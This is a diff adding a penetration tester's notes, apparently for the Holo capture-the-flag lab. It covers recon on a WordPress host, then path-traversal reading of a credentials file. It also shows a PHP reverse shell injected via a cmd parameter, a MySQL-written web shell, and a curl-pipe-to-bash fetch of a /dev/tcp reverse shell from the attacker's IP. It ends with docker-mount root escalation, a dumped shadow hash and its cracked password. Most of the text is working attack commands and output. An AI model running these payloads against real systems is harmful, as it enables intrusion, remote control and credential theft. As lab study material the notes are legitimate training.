@@ -1,0 +1,456 @@
+---------------------------------
+pub IPs
+
+10.200.120.33	L-SRV01 - Web
+10.200.120.250	??? - 22/1337
+
+---------------------------------
+ports web	10.200.120.33
+
+22		ssh
+80		http
+33060	mysqlx
+
+---------------------------------
+CME on web
+
+wordpress	(wp-admin.php)
+
+---------------------------------
+internal domain found
+
+www.holo.live
+admin.holo.live
+dev.holo.live
+
+---------------------------------
+robots.txt	admin.holo.live
+
+User-agent: *
+Disallow: /var/www/admin/db.php
+Disallow: /var/www/admin/dashboard.php
+Disallow: /var/www/admin/supersecretdir/creds.txt
+
+---------------------------------
+robots.txt	www.holo.live
+
+User-Agent: *
+Disallow: /var/www/wordpress/index.php
+Disallow: /var/www/wordpress/readme.html
+Disallow: /var/www/wordpress/wp-activate.php
+Disallow: /var/www/wordpress/wp-blog-header.php
+Disallow: /var/www/wordpress/wp-config.php
+Disallow: /var/www/wordpress/wp-content
+Disallow: /var/www/wordpress/wp-includes
+Disallow: /var/www/wordpress/wp-load.php
+Disallow: /var/www/wordpress/wp-mail.php
+Disallow: /var/www/wordpress/wp-signup.php
+Disallow: /var/www/wordpress/xmlrpc.php
+Disallow: /var/www/wordpress/license.txt
+Disallow: /var/www/wordpress/upgrade
+Disallow: /var/www/wordpress/wp-admin
+Disallow: /var/www/wordpress/wp-comments-post.php
+Disallow: /var/www/wordpress/wp-config-sample.php
+Disallow: /var/www/wordpress/wp-cron.php
+Disallow: /var/www/wordpress/wp-links-opml.php
+Disallow: /var/www/wordpress/wp-login.php
+Disallow: /var/www/wordpress/wp-settings.php
+Disallow: /var/www/wordpress/wp-trackback.php
+
+---------------------------------
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.20
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N]Y
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://www.holo.live/ [10.200.120.33]
+[+] Started: Sun Feb  6 10:59:13 2022
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache/2.4.29 (Ubuntu)
+ |  - X-UA-Compatible: IE=edge
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://www.holo.live/robots.txt
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://www.holo.live/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://www.holo.live/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://www.holo.live/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.5.3 identified (Insecure, released on 2020-10-30).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://www.holo.live/index.php/feed/, <generator>https://wordpress.org/?v=5.5.3</generator>
+ |  - http://www.holo.live/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.3</generator>
+
+[+] WordPress theme in use: generatepress
+ | Location: http://www.holo.live/wp-content/themes/generatepress/
+ | Last Updated: 2022-01-31T00:00:00.000Z
+ | Readme: http://www.holo.live/wp-content/themes/generatepress/readme.txt
+ | [!] The version is out of date, the latest version is 3.1.2
+ | Style URL: http://www.holo.live/wp-content/themes/generatepress/style.css
+ | Style Name: GeneratePress
+ | Style URI: https://generatepress.com
+ | Description: GeneratePress is a lightweight WordPress theme built with a focus on speed and usability. Performanc...
+ | Author: Tom Usborne
+ | Author URI: https://tomusborne.com
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ | Confirmed By: Urls In 404 Page (Passive Detection)
+ |
+ | Version: 2.4.2 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://www.holo.live/wp-content/themes/generatepress/style.css, Match: 'Version: 2.4.2'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Sun Feb  6 10:59:25 2022
+[+] Requests Done: 181
+[+] Cached Requests: 7
+[+] Data Sent: 36.764 KB
+[+] Data Received: 17.82 MB
+[+] Memory used: 239.312 MB
+[+] Elapsed time: 00:00:12
+
+
+---------------------------------
+web servers current dir
+
+http://www.holo.live/robots.txt
+
+---------------------------------
+images for development domain
+
+gobuster dir -u http://dev.holo.live -w /usr/share/wordlists/dirb/common.txt -x php
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://dev.holo.live
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2022/02/06 11:06:08 Starting gobuster in directory enumeration mode
+===============================================================
+/img.php              (Status: 200) [Size: 0]                                     
+                                                                                      
+===============================================================
+2022/02/06 11:06:28 Finished
+===============================================================
+
+http://dev.holo.live/images/img.php
+---------------------------------
+enter supersecretdir/creds.txt
+
+curl dev.holo.live/img.php?file=../../../../../../../../var/www/admin/supersecretdir/creds.txt
+
+I know you forget things, so I'm leaving this note for you:
+### admin:DBManagerLogin!
+- gurag <3
+
+---------------------------------
+dirb http://dev.holo.live
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Feb  6 10:46:12 2022
+URL_BASE: http://dev.holo.live/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://dev.holo.live/ ----
++ http://dev.holo.live/index.php (CODE:200|SIZE:7515)                 
++ http://dev.holo.live/login (CODE:403|SIZE:278)                      
++ http://dev.holo.live/server-status (CODE:403|SIZE:278)              
+-----------------                                                      
+END_TIME: Sun Feb  6 11:06:38 2022                                     
+DOWNLOADED: 27672 - FOUND: 5
+
+---------------------------------
+dirb http://admin.holo.live
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Feb  6 10:46:05 2022
+URL_BASE: http://admin.holo.live/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+GENERATED WORDS: 4612
+
++ http://admin.holo.live/index.php (CODE:200|SIZE:1845)               
++ http://admin.holo.live/robots.txt (CODE:200|SIZE:135)               
++ http://admin.holo.live/server-status (CODE:403|SIZE:280)     
+
+-----------------
+END_TIME: Sun Feb  6 11:29:36 2022
+DOWNLOADED: 59956 - FOUND: 3
+
+---------------------------------
+dashboard.php reverse shell
+
+http://admin.holo.live/dashboard.php?cmd=php -r '$sock=fsockopen("10.50.117.138",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+msfconsole -q
+use exploit/multi/handler
+set LHOST tun0
+set LPORT 1337
+run
+
+url encoding cmd=php ...
+
+http://admin.holo.live/dashboard.php?cmd=php+-r+'$sock%3dfsockopen("10.50.117.138",1337)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b'
+
+---------------------------------
+shell stabilisation
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+STRG + Z
+stty raw -echo
+fg
+
+---------------------------------
+enumerate docker
+
+www-data@40ee267c789a:/var/www/admin$ ls -la /
+total 340
+drwxr-xr-x   1 root root   4096 Feb  6 09:16 .
+drwxr-xr-x   1 root root   4096 Feb  6 09:16 ..
+-rwxr-xr-x   1 root root      0 Feb  6 09:16 .dockerenv
+
+www-data@40ee267c789a:/var/www/admin$ cat /proc/1/cgroup    
+12:devices:/docker/40ee267c789abeb5c7a2e72ebf2e44a7fed82a59678dbbee54364942bae263d7
+11:memory:/docker/40ee267c789abeb5c7a2e72ebf2e44a7fed82a59678dbbee54364942bae263d7
+10:cpuset:/docker/40ee267c789abeb5c7a2e72ebf2e44a7fed82a59678dbbee54364942bae263d7
+9:rdma:/
+8:blkio:/docker/40ee267c789abeb5c7a2e72ebf2e44a7fed82a59678dbbee54364942bae263d7
+7:freezer:/docker/40ee267c789abeb5c7a2e72ebf2e44a7fed82a59678dbbee54364942bae263d7
+6:perf_event:/docker/40ee267c789abeb5c7a2e72ebf2e44a7fed82a59678dbbee54364942bae263d7
+5:cpu,cpuacct:/docker/40ee267c789abeb5c7a2e72ebf2e44a7fed82a59678dbbee54364942bae263d7
+4:net_cls,net_prio:/docker/40ee267c789abeb5c7a2e72ebf2e44a7fed82a59678dbbee54364942bae263d7
+3:hugetlb:/docker/40ee267c789abeb5c7a2e72ebf2e44a7fed82a59678dbbee54364942bae263d7
+2:pids:/docker/40ee267c789abeb5c7a2e72ebf2e44a7fed82a59678dbbee54364942bae263d7
+1:name=systemd:/docker/40ee267c789abeb5c7a2e72ebf2e44a7fed82a59678dbbee54364942bae263d7
+0::/system.slice/containerd.service
+
+---------------------------------
+flag L-SRV02
+
+www-data@40ee267c789a:/var/www$ cat user.txt 
+HOLO{175d7322f8fc53392a417ccde356c3fe}
+
+---------------------------------
+enumerate Default Gateway Docker 
+
+www-data@40ee267c789a:/var/www$ nc -zv 192.168.100.1 1-65535
+ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 33060 (?) open
+ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 8080 (http-alt) open
+ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 3306 (mysql) open
+ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 80 (http) open
+ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 22 (ssh) open
+
+---------------------------------
+Get DB Connect Creds from Web Server
+
+cat db_connect.php 
+<?php
+
+define('DB_SRV', '192.168.100.1');
+define('DB_PASSWD', "!123SecureAdminDashboard321!");
+define('DB_USER', 'admin');
+define('DB_NAME', 'DashboardDB');
+
+mysql -h 192.168.100.1 -u admin -p 
+Enter password: !123SecureAdminDashboard321!
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| DashboardDB        |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql> use DashboardDB;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++-----------------------+
+| Tables_in_DashboardDB |
++-----------------------+
+| users                 |
++-----------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from users;
++----------+-----------------+
+| username | password        |
++----------+-----------------+
+| admin    | DBManagerLogin! |
+| gurag    | AAAA            |
++----------+-----------------+
+2 rows in set (0.00 sec)
+
+---------------------------------
+create shell via mysql on Gateway Docker
+
+mysql> select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell-ZhiliaoShi.php';
+Query OK, 1 row affected (0.00 sec)
+
+---------------------------------
+get into gateway docker
+
+on local kali machine:
+shellscript.sh
+#!/bin/bash
+bash -i >& /dev/tcp/10.50.117.138/53 0>&1
+
+python3 -m http.server 80                                                                                                                     
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+nc -lvnp 53
+
+on docker machine:
+
+curl 'http://192.168.100.1:8080/shell-ZhiliaoShi.php?cmd=curl%20http%3A%2F%2F10.50.117.138%3A80%2Fshellscript.sh%7Cbash%20%26'
+
+---------------------------------
+On Gateway Docker
+
+---------------------------------
+shell stabilisation
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+STRG + Z
+stty raw -echo
+fg
+
+---------------------------------
+
+www-data@ip-10-200-120-33:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
+<var/www/html$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/bin/umount
+/usr/bin/docker ###
+/usr/bin/fusermount
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/chsh
+
+use gtfo bins
+
+www-data@ip-10-200-120-33:/var/www/html$ docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+<none>              <none>              cb1b741122e8        12 months ago       995MB
+<none>              <none>              b711fc810515        13 months ago       993MB
+<none>              <none>              591bb8cd4ef6        13 months ago       993MB
+<none>              <none>              88d15ba62bf4        13 months ago       993MB
+ubuntu              18.04               56def654ec22        16 months ago       63.2MB
+
+docker run -v /:/mnt --rm -it 56def654ec22 chroot /mnt sh
+
+---------------------------------
+shell stabilisation
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+STRG + Z
+stty raw -echo
+fg
+
+---------------------------------
+user flag L-SRV01
+
+# cat /var/www/user.txt
+HOLO{3792d7d80c4dcabb8a533afddf06f666}
+
+---------------------------------
+root flag L-SRV01
+
+# cat /root/root.txt
+HOLO{e16581b01d445a05adb2e6d45eb373f7}
+
+---------------------------------
+non default user L-SRV01
+
+root@d189e36e42a9:/# cat /etc/shadow
+
+linux-admin:$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:18570:0:99999:7:::
+
+used a physical graphic on windows ...
+
+hashcat.exe linux-admin-hololive.txt rockyou.txt --show
+
+$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:linuxrulez
